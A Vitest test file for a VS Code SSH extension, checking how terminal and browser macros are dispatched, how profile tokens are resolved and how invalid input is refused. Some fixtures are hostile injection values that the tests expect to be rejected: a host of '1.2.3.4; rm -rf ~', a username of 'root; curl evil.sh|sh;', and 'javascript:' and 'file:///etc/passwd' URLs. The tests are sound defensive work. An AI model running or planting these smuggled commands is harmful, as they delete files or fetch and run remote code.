import { beforeEach, describe, expect, it, vi } from "vitest";
import type { AuthProfile, ServerConfig } from "../../src/models/config";
import type { TerminalMacro } from "../../src/models/terminalMacro";
import type { CommandContext } from "../../src/commands/types";

const registeredCommands = new Map<string, (...args: unknown[]) => unknown>();
const showQuickPick = vi.fn();
const showWarningMessage = vi.fn();
const showErrorMessage = vi.fn();
const showInformationMessage = vi.fn();
const setStatusBarMessage = vi.fn();
const executeCommand = vi.fn();
const openExternal = vi.fn(async () => true);
const createdTerminals: Array<{ name: string; sent: string[] }> = [];
let openTerminals: Array<{ name: string; sendText: (text: string, addNewLine?: boolean) => void; exitStatus?: unknown }> = [];

vi.mock("vscode", () => ({
  commands: {
    registerCommand: vi.fn((id: string, handler: (...args: unknown[]) => unknown) => {
      registeredCommands.set(id, handler);
      return { dispose: vi.fn() };
    }),
    executeCommand: (...args: unknown[]) => executeCommand(...args)
  },
  window: {
    showQuickPick: (...args: unknown[]) => showQuickPick(...args),
    showWarningMessage: (...args: unknown[]) => showWarningMessage(...args),
    showErrorMessage: (...args: unknown[]) => showErrorMessage(...args),
    showInformationMessage: (...args: unknown[]) => showInformationMessage(...args),
    setStatusBarMessage: (...args: unknown[]) => setStatusBarMessage(...args),
    createInputBox: vi.fn(),
    createTerminal: vi.fn((options: { name: string }) => {
      const record = { name: options.name, sent: [] as string[] };
      createdTerminals.push(record);
      return {
        name: options.name,
        show: vi.fn(),
        sendText: (text: string) => record.sent.push(text)
      };
    }),
    get terminals() {
      return openTerminals;
    },
    activeTerminal: undefined as unknown
  },
  env: {
    openExternal: (...args: unknown[]) => openExternal(...args)
  },
  Uri: {
    parse: (value: string) => ({ toString: () => value, value })
  },
  QuickInputButtons: { Back: {} }
}));

// The server-resolution helpers are exercised by serverCommands.test.ts; mocking
// them here keeps this file about macro dispatch and off the SSH/keygen imports.
const pickServer = vi.fn();
const connectServer = vi.fn(async () => {});
vi.mock("../../src/commands/serverCommands", () => ({
  pickServer: (...args: unknown[]) => pickServer(...args),
  connectServer: (...args: unknown[]) => connectServer(...args),
  toServerFromArg: (_core: unknown, arg: unknown) =>
    arg && typeof arg === "object" && "server" in arg ? (arg as { server: ServerConfig }).server : undefined
}));

import { InMemoryMacroStore } from "../../src/storage/inMemoryMacroStore";
import { setActiveMacroStore } from "../../src/macroSettings";
import {
  buildServerMacroPicks,
  resolveMacroBrowserUrl,
  runMacroOnServer
} from "../../src/commands/serverMacroCommands";

const store = new InMemoryMacroStore();

function server(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return {
    id: "srv-1",
    name: "Core Switch",
    host: "10.1.2.3",
    port: 22,
    username: "admin",
    authType: "password",
    isHidden: false,
    ...overrides
  };
}

function context(overrides: Partial<CommandContext> = {}): CommandContext {
  return {
    core: {
      getSnapshot: () => ({ activeSessions: [], servers: [] }),
      getAuthProfile: () => undefined,
      onDidChange: () => () => {}
    },
    sessionTerminals: new Map(),
    ...overrides
  } as unknown as CommandContext;
}

/** A context whose auth-profile lookup answers with `profiles`, keyed by id. */
function contextWithAuthProfiles(profiles: AuthProfile[]): CommandContext {
  return context({
    core: {
      getSnapshot: () => ({ activeSessions: [], servers: [] }),
      getAuthProfile: (id: string) => profiles.find((p) => p.id === id),
      onDidChange: () => () => {}
    }
  } as unknown as Partial<CommandContext>);
}

function authProfile(overrides: Partial<AuthProfile> = {}): AuthProfile {
  return { id: "ap-1", name: "BMC accounts", username: "bmc-operator", authType: "password", ...overrides };
}

async function setMacros(macros: TerminalMacro[]): Promise<void> {
  await store.save(macros);
}

beforeEach(async () => {
  registeredCommands.clear();
  showQuickPick.mockReset();
  showWarningMessage.mockReset();
  showErrorMessage.mockReset();
  showInformationMessage.mockReset();
  setStatusBarMessage.mockReset();
  executeCommand.mockReset();
  openExternal.mockClear();
  pickServer.mockReset();
  connectServer.mockReset();
  createdTerminals.length = 0;
  openTerminals = [];
  setActiveMacroStore(store);
  await store.clearAll();
});

describe("resolveMacroBrowserUrl", () => {
  it("accepts http and https", () => {
    expect(resolveMacroBrowserUrl("https://10.0.0.9/")).toBe("https://10.0.0.9/");
    expect(resolveMacroBrowserUrl("http://bmc.example.com/redfish")).toBe("http://bmc.example.com/redfish");
  });

  it("refuses every other scheme, and anything that is not a URL", () => {
    expect(resolveMacroBrowserUrl("javascript:alert(1)")).toBeUndefined();
    expect(resolveMacroBrowserUrl("file:///etc/passwd")).toBeUndefined();
    expect(resolveMacroBrowserUrl("vscode://extension/x")).toBeUndefined();
    expect(resolveMacroBrowserUrl("10.0.0.9")).toBeUndefined();
    expect(resolveMacroBrowserUrl("")).toBeUndefined();
  });
});

describe("buildServerMacroPicks", () => {
  it("sorts profile-token macros first without reordering the rest", async () => {
    const macros: TerminalMacro[] = [
      { id: "a", name: "Plain A", text: "show version\n" },
      { id: "b", name: "Uses profile", text: "ping ${profile.host}\n" },
      { id: "c", name: "Plain C", text: "show clock\n" }
    ];
    const picks = buildServerMacroPicks(macros, server());
    expect(picks.map((p) => p.label)).toEqual(["Uses profile", "Plain A", "Plain C"]);
  });

  it("lists a macro that needs an IPMI host the server lacks, and flags it", () => {
    const macros: TerminalMacro[] = [{ id: "a", name: "SOL", text: "ipmitool -H ${profile.ipmiHost}\n" }];
    const picks = buildServerMacroPicks(macros, server());
    // Listed, not hidden — hiding makes the feature undiscoverable.
    expect(picks).toHaveLength(1);
    expect(picks[0].issue?.token).toBe("ipmiHost");
    expect(picks[0].detail).toContain("IPMI / BMC Host");
  });

  it("does not flag it once the server has one", () => {
    const macros: TerminalMacro[] = [{ id: "a", name: "SOL", text: "ipmitool -H ${profile.ipmiHost}\n" }];
    const picks = buildServerMacroPicks(macros, server({ ipmiHost: "10.0.0.9" }));
    expect(picks[0].issue).toBeUndefined();
    expect(picks[0].detail).toBeUndefined();
  });

  it("redacts a secret macro's value and marks a prompting macro", () => {
    const macros: TerminalMacro[] = [
      { id: "a", name: "Password", text: "hunter2\n", secret: true },
      { id: "b", name: "Prompted", text: "ssh $user@host\n", variables: [{ name: "user" }] }
    ];
    const picks = buildServerMacroPicks(macros, server());
    expect(picks[0].description).toContain("***");
    expect(picks[0].description).not.toContain("hunter2");
    expect(picks[1].description).not.toBe("ssh $user@host\\n");
  });

  it("badges a macro that does not run in the session", () => {
    const macros: TerminalMacro[] = [{ id: "a", name: "BMC", text: "https://x/", runIn: "browser" }];
    expect(buildServerMacroPicks(macros, server())[0].description).toContain("[Browser]");
  });
});

describe("nexus.server.runMacro — dispatch", () => {
  it("opens an https URL for a browser macro, with the profile token filled in", async () => {
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(openExternal).toHaveBeenCalledTimes(1);
    expect((openExternal.mock.calls[0][0] as { value: string }).value).toBe("https://10.0.0.9/");
  });

  it("refuses a javascript: URL — nothing is opened and the failure is reported", async () => {
    await setMacros([{ id: "a", name: "Evil", text: "javascript:alert(1)", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    expect(openExternal).not.toHaveBeenCalled();
    expect(showErrorMessage).toHaveBeenCalled();
    // Never claim a send for something that was refused.
    expect(setStatusBarMessage).not.toHaveBeenCalled();
  });

  it("reports a browser open the OS refused, and never claims it was sent", async () => {
    // REVIEW FINDING (P2) — `openExternal` resolves to a BOOLEAN, and `false` is
    // a real outcome (no handler for the scheme, or the user dismissed the
    // "allow this extension to open a URI?" trust prompt). The pre-fix target
    // returned a hardcoded `true`, so this run ended in `Macro "BMC" sent to the
    // browser.` with nothing open anywhere.
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    openExternal.mockResolvedValueOnce(false as unknown as true);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(openExternal).toHaveBeenCalledTimes(1);
    // No success claim — this is what the always-true return produced.
    expect(setStatusBarMessage).not.toHaveBeenCalled();
    // Reported EXACTLY ONCE: `runMacroWithTarget` treats a `false` send as
    // "the target already said why" and stays silent, so the target must speak.
    expect(showWarningMessage).toHaveBeenCalledTimes(1);
    expect(String(showWarningMessage.mock.calls[0][0])).toBe('Could not open "BMC" in the browser.');
  });

  it("says nothing extra when the browser open succeeds", async () => {
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(showWarningMessage).not.toHaveBeenCalled();
    expect(String(setStatusBarMessage.mock.calls[0][0])).toBe('Macro "BMC" sent to the browser.');
  });

  it("runs a localTerminal macro in a fresh terminal, never through sendSequence", async () => {
    await setMacros([
      { id: "a", name: "SOL", text: " ipmitool -H ${profile.ipmiHost} sol activate\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }) });

    expect(createdTerminals).toHaveLength(1);
    expect(createdTerminals[0].sent).toEqual([" ipmitool -H 10.0.0.9 sol activate\n"]);
    // `workbench.action.terminal.sendSequence` targets whatever terminal is
    // focused — the exact mis-delivery this command exists to avoid.
    expect(executeCommand).not.toHaveBeenCalledWith("workbench.action.terminal.sendSequence", expect.anything());
  });

  it("unescapes $${profile.host} EXACTLY ONCE on the server path — never twice", async () => {
    // The other side of the P2 fix. `unescapeProfileTokens()` was added to every
    // send path that does NOT go through `resolveProfileTokens()`; this path
    // does, so applying it again (e.g. by moving the unescape into the shared
    // `resolveMacroText`) would turn `$$${profile.host}` into a resolved VALUE
    // instead of the literal token the escape promises.
    await setMacros([
      { id: "a", name: "Docs", text: "echo $${profile.host} / $$${profile.host}\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server({ host: "10.1.2.3" }) });

    expect(createdTerminals).toHaveLength(1);
    // One `$` dropped per token, once. A second pass would yield
    // `echo 10.1.2.3 / ${profile.host}`.
    expect(createdTerminals[0].sent).toEqual(["echo ${profile.host} / $${profile.host}\n"]);
    expect(createdTerminals[0].sent[0]).not.toContain("10.1.2.3");
  });

  it("refuses a macro whose ipmiHost the server lacks, and offers Edit Server", async () => {
    await setMacros([{ id: "a", name: "SOL", text: "ipmitool -H ${profile.ipmiHost}\n", runIn: "localTerminal" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue("Edit Server");

    const target = server();
    await runMacroOnServer(context(), { server: target });

    // Nothing sent anywhere — not a literal token, not an empty -H argument.
    expect(createdTerminals).toHaveLength(0);
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI / BMC Host");
    // `expandAdvanced` — "IPMI / BMC Host" lives behind the form's Advanced
    // section, so the button must open it rather than land on a collapsed field.
    expect(executeCommand).toHaveBeenCalledWith("nexus.server.edit", { server: target, expandAdvanced: true });
  });

  it("refuses a host that carries shell syntax before anything is run", async () => {
    await setMacros([{ id: "a", name: "Ping", text: "ping ${profile.host}\n", runIn: "localTerminal" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server({ host: "1.2.3.4; rm -rf ~" }) });

    expect(createdTerminals).toHaveLength(0);
    expect(showErrorMessage).toHaveBeenCalled();
  });

  it("sends a session macro to THIS server's session terminal, not the active terminal", async () => {
    await setMacros([{ id: "a", name: "Version", text: "show version\n" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    const sent: string[] = [];
    const sessionTerminal = { name: "Nexus SSH: Core Switch", sendText: (text: string) => sent.push(text) };
    const otherTerminal = { name: "Some other host", sendText: () => expect.unreachable("wrong terminal") };
    openTerminals = [otherTerminal, sessionTerminal];

    const ctx = context({
      core: {
        getSnapshot: () => ({ activeSessions: [{ id: "sess-1", serverId: "srv-1" }], servers: [] }),
        onDidChange: () => () => {}
      },
      sessionTerminals: new Map([["sess-1", sessionTerminal]])
    } as unknown as Partial<CommandContext>);

    await runMacroOnServer(ctx, { server: server() });

    expect(sent).toEqual(["show version\n"]);
  });

  it("offers to connect first when the server has no session, and sends nothing if declined", async () => {
    await setMacros([{ id: "a", name: "Version", text: "show version\n" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(String(showWarningMessage.mock.calls[0][0])).toContain("not connected");
    expect(connectServer).not.toHaveBeenCalled();
    expect(setStatusBarMessage).not.toHaveBeenCalled();
  });

  it("runs a preselected macro without ever showing the macro picker", async () => {
    // The redirect from `nexus.macro.run` / a keybinding already knows WHICH
    // macro — it only lacks a server. Re-asking would cost the user the
    // selection they just made.
    await setMacros([
      { id: "a", name: "Other", text: "show version\n" },
      { id: "b", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }
    ]);

    await runMacroOnServer(context(), { server: server({ ipmiHost: "10.0.0.9" }), macro: { id: "b" } });

    expect(showQuickPick).not.toHaveBeenCalled();
    expect(openExternal).toHaveBeenCalledTimes(1);
    expect((openExternal.mock.calls[0][0] as { value: string }).value).toBe("https://10.0.0.9/");
  });

  it("prefers the STORED record over the macro object the caller was holding", async () => {
    // The caller's copy can be stale — the store is the source of truth for what
    // running this macro does.
    await setMacros([{ id: "b", name: "BMC", text: "https://${profile.ipmiHost}/edited", runIn: "browser" }]);

    await runMacroOnServer(context(), {
      server: server({ ipmiHost: "10.0.0.9" }),
      macro: { id: "b", name: "BMC", text: "https://stale.example.com/", runIn: "browser" }
    });

    expect((openExternal.mock.calls[0][0] as { value: string }).value).toBe("https://10.0.0.9/edited");
  });

  it("still opens the picker for a server argument that names no macro", async () => {
    await setMacros([{ id: "a", name: "Version", text: "show version\n" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(showQuickPick).toHaveBeenCalled();
  });

  it("points at the templates when there are no macros at all", async () => {
    showInformationMessage.mockResolvedValue("Add From Template…");

    await runMacroOnServer(context(), { server: server() });

    expect(String(showInformationMessage.mock.calls[0][0])).toContain("IPMI templates");
    // Both routes offered; the template one is what this command exists for.
    expect(showInformationMessage.mock.calls[0].slice(1)).toEqual(["Add From Template…", "Add Blank Macro"]);
    expect(executeCommand).toHaveBeenCalledWith("nexus.macro.addFromTemplate");
  });

  it("offers Edit Macro when a browser macro's text is not a URL", async () => {
    await setMacros([{ id: "a", name: "Evil", text: "javascript:alert(1)", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue("Edit Macro");

    await runMacroOnServer(context(), { server: server() });

    // The fix is in the macro's text, so the repair button opens the macro —
    // the mirror of the Edit Server button on a profile-token refusal.
    expect(showErrorMessage.mock.calls[0][1]).toBe("Edit Macro");
    expect(executeCommand).toHaveBeenCalledWith(
      "nexus.macro.edit",
      expect.objectContaining({ index: 0 })
    );
  });

  it("falls back to the server picker when invoked from the palette", async () => {
    await setMacros([{ id: "a", name: "BMC", text: "https://${profile.ipmiHost}/", runIn: "browser" }]);
    pickServer.mockResolvedValue(server({ ipmiHost: "10.0.0.9" }));
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), undefined);

    expect(pickServer).toHaveBeenCalled();
    expect(openExternal).toHaveBeenCalledTimes(1);
  });
});

/**
 * REVIEW FINDING (P2) — an unknown `${profile.…}` token is a warning, never a
 * failure, so the only question is WHEN it is said. It used to be said the
 * instant the tokens resolved: before the prompt walk, before the "connect
 * first?" confirmation and before the browser URL check — each of which can
 * abort, leaving the user told about text that was never sent — and, when the
 * send did happen, the success status replaced it in the same tick, so nobody
 * ever read it. It now rides along with the delivery report.
 */
describe("nexus.server.runMacro — unknown profile tokens are reported WITH the delivery", () => {
  /** `xyz` is not in the whitelist, so it is passed through verbatim and warned about. */
  const UNKNOWN_TOKEN_MACRO: TerminalMacro = {
    id: "u",
    name: "Typo",
    text: "ipmitool -H ${profile.xyz}\n",
    runIn: "localTerminal"
  };

  function statusMessages(): string[] {
    return setStatusBarMessage.mock.calls.map((call) => String(call[0]));
  }

  it("says it once, with the send confirmation, when the text is delivered", async () => {
    await setMacros([UNKNOWN_TOKEN_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    // The token went out verbatim — that is the documented behaviour.
    expect(createdTerminals[0].sent).toEqual(["ipmitool -H ${profile.xyz}\n"]);
    // ONE message, combining outcome and caveat. The pre-fix implementation
    // produced two, the caveat first and immediately overwritten.
    expect(statusMessages()).toEqual([
      'Macro "Typo" sent to a local terminal — unknown profile token ${profile.xyz} was sent as-is.'
    ]);
  });

  it("pluralises, and lists each unknown token once", async () => {
    await setMacros([
      { id: "u2", name: "Typos", text: "${profile.xyz} ${profile.abc} ${profile.xyz}\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    expect(statusMessages()).toEqual([
      'Macro "Typos" sent to a local terminal — unknown profile tokens ${profile.xyz}, ${profile.abc} were sent as-is.'
    ]);
  });

  it("says nothing when the run is abandoned before anything is sent", async () => {
    // A session macro on a disconnected server: the "connect first?" prompt is
    // declined, so nothing is delivered. The pre-fix implementation had already
    // announced what "was sent as-is" by this point.
    await setMacros([{ ...UNKNOWN_TOKEN_MACRO, runIn: "session" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(connectServer).not.toHaveBeenCalled();
    expect(createdTerminals).toHaveLength(0);
    expect(statusMessages()).toEqual([]);
  });

  it("says nothing when the browser target refuses the text", async () => {
    // The other post-resolution abort: a `browser` macro whose text is not an
    // http(s) URL never opens anything.
    await setMacros([{ id: "u3", name: "Typo", text: "javascript:alert(${profile.xyz})", runIn: "browser" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(context(), { server: server() });

    expect(openExternal).not.toHaveBeenCalled();
    expect(statusMessages()).toEqual([]);
  });

  it("leaves the confirmation alone when every token is known", async () => {
    await setMacros([{ id: "k", name: "SOL", text: "ipmitool -H ${profile.host}\n", runIn: "localTerminal" }]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(context(), { server: server() });

    expect(statusMessages()).toEqual(['Macro "SOL" sent to a local terminal.']);
  });
});

/**
 * REVIEW FINDING (P2) — `${profile.username}` must name the account a SESSION
 * would log in as. A linked auth profile takes the username over at connect time
 * (`SilentAuthSshFactory.resolveServer` spreads `authProfileOwnedCredentials`),
 * while the server keeps its own stored underneath the link — so reading
 * `server.username` here puts the wrong account on the command line, in exactly
 * the shipped `ipmitool -U ${profile.username}` case.
 */
describe("nexus.server.runMacro — ${profile.username} and linked auth profiles", () => {
  const USERNAME_MACRO: TerminalMacro = {
    id: "u",
    name: "SOL",
    text: "ipmitool -U ${profile.username} sol activate\n",
    runIn: "localTerminal"
  };

  it("resolves to the LINKED PROFILE's username, not the one stored on the server", async () => {
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "bmc-operator" })]), {
      // The server's own username survives beneath the link and differs — this
      // fixture is the whole point: reading `server.username` sends "admin".
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U bmc-operator sol activate\n"]);
  });

  it("uses the server's own username when there is no link", async () => {
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([authProfile()]), { server: server({ username: "admin" }) });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
  });

  it("falls back to the server's username when the linked profile supplies none", async () => {
    // The connect path's precedence, mirrored exactly: `authProfileOwnedCredentials`
    // owns `username` only when the profile supplies a USABLE one, so a blank or
    // whitespace-only username (reachable through an imported backup) leaves the
    // server's own standing rather than blanking it.
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "   " })]), {
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
  });

  it("falls back to the server's username when the link resolves to no profile at all", async () => {
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    await runMacroOnServer(contextWithAuthProfiles([]), {
      server: server({ username: "admin", authProfileId: "ap-gone" })
    });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
  });

  it("checks the PROFILE's username against the charset, and refuses the run", async () => {
    // The effective value flows through the same `username` charset check — that
    // is the point: an auth profile is as importable as a server record, and the
    // resolved line runs on the user's own machine.
    await setMacros([USERNAME_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "root; curl evil.sh|sh;" })]), {
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(createdTerminals).toHaveLength(0);
    expect(showErrorMessage).toHaveBeenCalled();
    // Refused on the profile's value — never quietly resolved to the server's.
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("root; curl evil.sh|sh;");
  });

  it("flags the picker entry against the EFFECTIVE username too, so flag and refusal agree", async () => {
    await setMacros([USERNAME_MACRO]);
    let listed: Array<{ issue?: { token: string } }> = [];
    showQuickPick.mockImplementation(async (items: Array<{ issue?: { token: string } }>) => {
      listed = items;
      return undefined;
    });

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "bad name" })]), {
      // A perfectly legal `server.username`: only the profile's value is bad, so
      // a picker built from the raw record would show no warning at all.
      server: server({ username: "admin", authProfileId: "ap-1" })
    });

    expect(listed[0].issue?.token).toBe("username");
  });
});

/**
 * REVIEW FINDING (P2) — the connect-first flow's three endings.
 *
 * `SshPty.start()` CATCHES its own initial-connect errors: on a refused
 * password or an unreachable host the terminal stays open holding a "Connection
 * failed / press any key to close" notice, the pty is not disposed, no session
 * is registered and nothing closes. The flow therefore had no failure signal at
 * all and sat out the whole 90-second watchdog before claiming it had
 * "connected". `ConnectServerOptions.onConnectFailed` is that signal.
 */
describe("nexus.server.runMacro — connect-first flow", () => {
  const SESSION_MACRO: TerminalMacro = { id: "s", name: "Version", text: "show version\n", runIn: "session" };

  /** A core with no sessions yet and a live change event, plus a way to add one. */
  function connectableCore(): {
    core: unknown;
    register: (session: { id: string; serverId: string }) => void;
  } {
    const listeners = new Set<() => void>();
    const activeSessions: Array<{ id: string; serverId: string }> = [];
    return {
      core: {
        getSnapshot: () => ({ activeSessions: [...activeSessions], servers: [] }),
        getAuthProfile: () => undefined,
        onDidChange: (listener: () => void) => {
          listeners.add(listener);
          return () => listeners.delete(listener);
        }
      },
      register: (session) => {
        activeSessions.push(session);
        for (const listener of [...listeners]) {
          listener();
        }
      }
    };
  }

  function warnings(): string[] {
    return showWarningMessage.mock.calls.map((call) => String(call[0]));
  }

  it("settles the instant the connect fails, instead of waiting out the 90s watchdog", async () => {
    await setMacros([SESSION_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue("Connect and Run");
    connectServer.mockImplementation(
      async (_ctx: unknown, _id: unknown, options?: { onConnectFailed?: (message: string) => void }) => {
        // What production does: connectServer resolves (the terminal exists),
        // and the pty's own connect then fails inside it.
        options?.onConnectFailed?.("All configured authentication methods failed");
      }
    );

    const { core } = connectableCore();
    const ctx = context({ core } as unknown as Partial<CommandContext>);

    vi.useFakeTimers();
    try {
      let done = false;
      const run = runMacroOnServer(ctx, { server: server() }).then(() => {
        done = true;
      });

      // One second of virtual time — 1/90th of the watchdog. The pre-fix flow
      // could not settle until the timer itself fired.
      await vi.advanceTimersByTimeAsync(1_000);

      expect(done).toBe(true);
      expect(warnings()[1]).toBe('Could not connect to "Core Switch" — nothing was sent.');
      // Never the timeout copy: nothing timed out, and nothing "connected".
      expect(warnings().some((message) => message.includes("no session appeared in time"))).toBe(false);
      await run;
    } finally {
      vi.useRealTimers();
    }
  });

  it("still falls back to the timeout when the connect neither fails nor produces a session", async () => {
    await setMacros([SESSION_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue("Connect and Run");
    // Resolves and then nothing at all happens — a connect that hangs past the
    // watchdog, which is the only case the timer is still there for.
    connectServer.mockImplementation(async () => {});

    const { core } = connectableCore();
    const ctx = context({ core } as unknown as Partial<CommandContext>);

    vi.useFakeTimers();
    try {
      let done = false;
      const run = runMacroOnServer(ctx, { server: server() }).then(() => {
        done = true;
      });

      await vi.advanceTimersByTimeAsync(1_000);
      expect(done).toBe(false);

      await vi.advanceTimersByTimeAsync(90_000);
      expect(done).toBe(true);
      expect(warnings()[1]).toBe("Connected to Core Switch but no session appeared in time — nothing was sent.");
      await run;
    } finally {
      vi.useRealTimers();
    }
  });

  it("sends the macro to the terminal of the session the connect produced", async () => {
    await setMacros([SESSION_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue("Connect and Run");

    const sent: string[] = [];
    const sessionTerminal = { name: "Nexus SSH: Core Switch", sendText: (text: string) => sent.push(text) };
    openTerminals = [sessionTerminal];

    const { core, register } = connectableCore();
    const sessionTerminals = new Map<string, unknown>();
    connectServer.mockImplementation(async () => {
      sessionTerminals.set("sess-new", sessionTerminal);
      register({ id: "sess-new", serverId: "srv-1" });
    });
    const ctx = context({ core, sessionTerminals } as unknown as Partial<CommandContext>);

    await runMacroOnServer(ctx, { server: server() });

    expect(sent).toEqual(["show version\n"]);
    // Only the "not connected — connect now?" prompt; no failure copy of either kind.
    expect(warnings()).toHaveLength(1);
    expect(warnings()[0]).toContain("not connected");
  });
});
